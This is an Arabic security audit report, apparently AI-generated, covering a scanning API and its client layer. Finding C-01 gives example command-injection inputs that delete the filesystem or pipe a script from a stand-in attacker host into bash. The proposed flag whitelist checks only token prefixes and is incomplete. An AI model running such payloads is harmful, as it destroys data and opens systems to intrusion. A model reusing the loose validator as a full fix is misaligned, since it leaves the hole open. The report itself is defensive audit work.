# تقرير المراجعة الشاملة — Sentinel Guard + Empire
**التاريخ:** 2026-04-25  
**المراجع:** Claude Code  
**المشروع:** Sentinel Guard API + Empire Integration Layer  
**إجمالي المشاكل:** 45 مشكلة

---

## ملخص تنفيذي

| الخطورة | العدد |
|---------|-------|
| 🔴 حرج (Critical) | 3 |
| 🟠 عالٍ (High) | 4 |
| 🟡 متوسط (Medium) | 13 |
| 🟢 منخفض (Low) | 25 |

---

## 🔴 المشاكل الحرجة

### [C-01] حقن أوامر Shell عبر معامل Nmap
- **الملف:** `sentinel-guard/app/api/v1/scans.py:8`
- **الكود:** `nmap_arguments: str = Field(default="-sV -sC --open", max_length=200)`
- **المشكلة:** المستخدم يمرر أي نص طول 200 حرف مباشرة إلى shell عبر nmap3
- **مثال الهجوم:** `"-sV; rm -rf /"` أو `"-sV && curl attacker.com/shell | bash"`
- **الإصلاح:** إنشاء whitelist للـ flags المسموح بها فقط

```python
ALLOWED_FLAGS = {"-sV", "-sC", "--open", "-T4", "-p", "--top-ports"}

def validate_nmap_args(args: str) -> str:
    for token in args.split():
        if not any(token.startswith(f) for f in ALLOWED_FLAGS):
            raise ValueError(f"Flag not allowed: {token}")
    return args
```

---

### [C-02] التحقق من ملكية IP عبر WHOIS مُعطَّل
- **الملف:** `sentinel-guard/app/services/verification/manager.py:48`
- **الكود:** `elif method == VerificationMethod.WHOIS_EMAIL: success = True`
- **المشكلة:** أي مستخدم يختار WHOIS يحصل على التحقق تلقائياً بدون إثبات
- **الإصلاح:** ربط بخدمة إرسال بريد إلكتروني حقيقية وتأكيد Token

---

### [C-03] Rate Limiting معرَّف لكن غير مُفعَّل
- **الملف:** `sentinel-guard/app/main.py:12,35-36`
- **الكود:** `limiter = Limiter(key_func=get_remote_address)` — لا يوجد `@limiter.limit()` على أي endpoint
- **المشكلة:** API مفتوح للـ brute force والـ flood attacks
- **الإصلاح:** إضافة decorators على جميع الـ routes

```python
@router.post("/login")
@limiter.limit("5/minute")
async def login(...): ...
```

---

## 🟠 المشاكل العالية

### [H-01] إلغاء الفحص لا يوقف مهمة Celery
- **الملف:** `sentinel-guard/app/api/v1/scans.py:91-101`
- **المشكلة:** `cancel_scan()` يغير الحالة في قاعدة البيانات فقط، لكن Worker يكمل الفحص
- **الإصلاح:**
```python
from celery.result import AsyncResult
if scan.celery_task_id:
    AsyncResult(scan.celery_task_id).revoke(terminate=True)
```

---

### [H-02] العلاقة `Asset.owner` غير معرَّفة
- **الملف:** `sentinel-guard/app/models/asset.py`
- **المشكلة:** `owner_id` موجود كـ ForeignKey لكن لا يوجد `relationship`
- **الإصلاح:** إضافة السطر:
```python
owner: Mapped["User"] = relationship("User", foreign_keys=[owner_id])
```

---

### [H-03] نمط import غير معياري في auth.py
- **الملف:** `sentinel-guard/app/api/v1/auth.py:85`
- **الكود:** `__import__("app.api.deps", fromlist=["get_current_user"]).get_current_user`
- **المشكلة:** جميع الملفات الأخرى تستخدم `from app.api.deps import get_current_user`
- **الإصلاح:** توحيد نمط الـ import

---

### [H-04] APIKey غير مُصدَّر من models/__init__.py
- **الملف:** `sentinel-guard/app/models/__init__.py`
- **المشكلة:** `APIKey` معرَّف في `user.py` لكن غائب من `__all__`
- **الإصلاح:** إضافة `"APIKey"` إلى قائمة الـ export

---

## 🟡 المشاكل المتوسطة

### [M-01] لا يوجد endpoint لبروفايل المستخدم
- **الملف:** `sentinel-guard/app/api/v1/auth.py`
- **المشكلة:** لا يوجد `GET /auth/me` لاسترجاع بيانات المستخدم الحالي
- **التأثير:** Dashboard و Bot لا يستطيعان عرض اسم المستخدم

---

### [M-02] لا توجد endpoints لإدارة المؤسسة
- **الملف:** `sentinel-guard/app/api/v1/`
- **المشكلة:** لا يمكن إدارة Organization بعد التسجيل
- **المطلوب:** `GET/PUT /organizations`, `POST /organizations/members`

---

### [M-03] API Key لا يعمل للمصادقة
- **الملف:** `sentinel-guard/app/api/deps.py`
- **المشكلة:** `APIKey` model موجود ويُنشأ لكن لا يُستخدم للمصادقة
- **المطلوب:** إضافة مسار `X-API-Key` header في `get_current_user`

---

### [M-04] Headers Scanner يفترض HTTPS دائماً
- **الملف:** `sentinel-guard/app/services/scanner/orchestrator.py:49`
- **الكود:** `url = target if target.startswith("http") else f"https://{target}"`
- **المشكلة:** الـ domains التي تعمل على HTTP فقط تفشل بصمت

---

### [M-05] SSL Scanner يفحص المنفذ 443 فقط
- **الملف:** `sentinel-guard/app/services/scanner/ssl_scanner.py:15`
- **المشكلة:** لا يفحص المنافذ البديلة (8443، 9443)

---

### [M-06] Severity من Scanners لا تُتحقق منها
- **الملف:** `sentinel-guard/app/workers/scan_tasks.py:70`
- **المشكلة:** إذا أرجع Scanner قيمة خاطئة مثل `"critical "` (مسافة) يتحول لـ `INFO`
- **الإصلاح:** validate قبل mapping

---

### [M-07] Empire Client يستخدم بيانات اعتماد نصية
- **الملف:** `empire/sentinel_client.py:130-137`
- **المشكلة:** `SENTINEL_EMAIL` و `SENTINEL_PASSWORD` من `.env` بنص واضح، لا token cache
- **المطلوب:** استخدام API Key بدلاً من password

---

### [M-08] Stats يُنفِّذ N+1 طلبات
- **الملف:** `empire/sentinel_client.py:65-88`
- **المشكلة:** `stats()` ينفذ: 1 (assets) + 1 (scans) + 5 (scan details) = 7 طلبات
- **المطلوب:** endpoint `/stats` واحد في الـ API

---

### [M-09] لا يوجد حد للفحوصات المتزامنة
- **الملف:** `sentinel-guard/app/core/config.py:31`
- **الكود:** `MAX_CONCURRENT_SCANS: int = 5` — معرَّف لكن لا يُستخدم في أي مكان
- **التأثير:** Worker يمكن إغراقه بمئات الفحوصات

---

### [M-10] لا يوجد retry للفحوصات الفاشلة
- **الملف:** `sentinel-guard/app/workers/scan_tasks.py`
- **المشكلة:** أي خطأ شبكي عابر يُفشل الفحص نهائياً
- **الإصلاح:** `@celery_app.task(autoretry_for=(Exception,), max_retries=3)`

---

### [M-11] Empire لا تحتوي إلا على client فقط
- **الملف:** `empire/`
- **المشكلة:** `web_dashboard.py` و `al_hakim_bot.py` المُدمجَين لم يُكتبا بعد
- **المطلوب:** ملفات Dashboard و Bot المُدمجة

---

### [M-12] لا يوجد Audit Log
- **الملف:** `sentinel-guard/app/main.py`
- **المشكلة:** لا يُسجَّل من طلب الفحص ومن أي IP
- **المطلوب:** Middleware يسجل جميع العمليات

---

### [M-13] Empire لا تملك ملف إعداد
- **الملف:** `empire/`
- **المشكلة:** لا يوجد `.env.example` ولا `requirements.txt` خاص بـ Empire

---

## 🟢 المشاكل المنخفضة

| # | الملف | المشكلة |
|---|-------|---------|
| L-01 | `alembic/` | لا توجد migration files — يعتمد على auto-create |
| L-02 | `app/models/asset.py` | `verification_token` لا ينتهي صلاحيته |
| L-03 | `app/api/v1/reports.py:101` | لا يمكن إنشاء تقرير جزئي عند فشل الفحص |
| L-04 | `app/services/scanner/orchestrator.py:70` | النتائج المكررة من Shodan+Nmap لا تُدمج |
| L-05 | `app/services/scanner/orchestrator.py:87` | Risk score يتجاهل silently القيم غير المعروفة |
| L-06 | `app/models/user.py:17` | `is_verified` يُضبط false ولا يُحدَّث أبداً |
| L-07 | `empire/sentinel_client.py` | لا تستدعي endpoint التحقق من التقرير |
| L-08 | `app/main.py:40` | CORS domain مكتوب يدوياً `"yourdomain.com"` |
| L-09 | `app/main.py:47` | TrustedHosts مكتوب يدوياً |
| L-10 | `app/core/config.py:22` | SECRET_KEY الافتراضي لا يُجبَر على التغيير |
| L-11 | `app/main.py` | لا يوجد HTTPS redirect middleware |
| L-12 | `app/services/scanner/orchestrator.py:52` | Exceptions تُبتلع بصمت |
| L-13 | `app/services/scanner/nmap_scanner.py:111` | NSE output مقطوع عند 1000 حرف |
| L-14 | `app/services/scanner/shodan_scanner.py:35` | لا تحقق من صيغة الـ domain |
| L-15 | جميع الملفات | Timezone مثبّت UTC ولا يمكن تغييره |
| L-16 | `empire/sentinel_client.py` | Type hints ناقصة في بعض الدوال |
| L-17 | `empire/sentinel_client.py:115` | `_get()` يُرجع `[]` عند الخطأ بدون إشارة |
| L-18 | `empire/sentinel_client.py:90` | `latest_findings()` يُحمِّل كل الفحوصات في الذاكرة |
| L-19 | `app/api/v1/assets.py:77` | Assets endpoint لا يدعم فلترة |
| L-20 | `app/services/reporter/generator.py:22` | RSA key generation غير thread-safe |
| L-21 | `app/services/scanner/nmap_scanner.py:18` | Process لا يُقتل عند timeout |
| L-22 | `app/api/v1/` | لا يوجد docstrings للـ endpoints |
| L-23 | `app/schemas/scan.py` | ScanType لا يوثّق ما يفعله كل نوع |
| L-24 | `app/core/security.py:36` | `decode_token()` يُرجع `{}` على الخطأ بدون تمييز |
| L-25 | `app/api/v1/scans.py:77` | Assets list عند الـ list لا تدعم pagination |

---

## خطة الإصلاح المقترحة

### المرحلة 1 — حرج وعالٍ (أولوية قصوى)
- [ ] تأمين Nmap ضد Command Injection [C-01]
- [ ] تفعيل Rate Limiting [C-03]
- [ ] إكمال WHOIS verification [C-02]
- [ ] إيقاف Celery task عند الإلغاء [H-01]

### المرحلة 2 — متوسط
- [ ] إضافة `GET /auth/me` endpoint [M-01]
- [ ] تفعيل API Key authentication [M-03]
- [ ] كتابة `web_dashboard.py` المُدمج [M-11]
- [ ] كتابة `al_hakim_bot.py` المُدمج [M-11]
- [ ] إضافة `empire/.env.example` [M-13]

### المرحلة 3 — منخفض
- [ ] إضافة Alembic migrations [L-01]
- [ ] إضافة verification token expiry [L-02]
- [ ] تكوين CORS و TrustedHosts من `.env` [L-08, L-09]
- [ ] إضافة Audit logging middleware [M-12]

---

*تقرير مُولَّد تلقائياً — SHA3-256 المشروع: `24fecf15654d163867103a6dd6ae11a010dfe8b8f57e082c68c3842937d1ef3a`*
